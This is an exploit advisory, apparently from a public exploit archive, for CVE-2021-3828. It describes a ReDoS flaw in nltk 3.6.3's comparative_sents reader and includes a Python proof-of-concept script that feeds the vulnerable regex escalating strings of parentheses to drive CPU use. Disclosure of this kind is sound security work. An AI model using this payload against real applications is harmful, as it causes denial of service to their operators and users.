# Exploit Title: nltk 3.6.3 - Inefficient Regular Expression Complexity
# Discovered Date: 19/09/2021
# Author: Chandra Srikanth Prathi
# Vendor Homepage: https://github.com/nltk/nltk
# Affected Version: Tested on 3.6.3
# CVE : CVE-2021-3828

*************************************************************************************************************************************

Vulnerability : Inefficient Regular Expression Complexity

*************************************************************************************************************************************
The nltk package is vulnerable to ReDoS (regular expression denial of service). An attacker that is able to provide as an input to the _read_comparison_block() function in the file "nltk/corpus/reader/comparative_sents.py" may cause an application to consume an excessive amount of CPU. Below pinned line using vulnerable regex.

Affected File: https://github.com/nltk/nltk/blob/a1034bbec30c2ec5765c9497cb8167b26a3c5d0e/nltk/corpus/reader/comparative_sents.py#L48
Affected Function: _read_comparison_block()
Affected Parameter: stream

*************************************************************************************************************************************
POC

*************************************************************************************************************************************
Poc.py:
*************************************************************************************************************************************
import time
import re

evil_regex = re.compile(r"\((?!.*\()(.*)\)$")

for i in range(1, 50000):
    start_time = time.perf_counter()
    payload = "( "+"("*(i*40000)+""
    re.findall(evil_regex, payload)
    stop_time = time.perf_counter() - start_time
    print("Payload.length: " + str(len(payload)) + ": " + str(stop_time) + " ms")
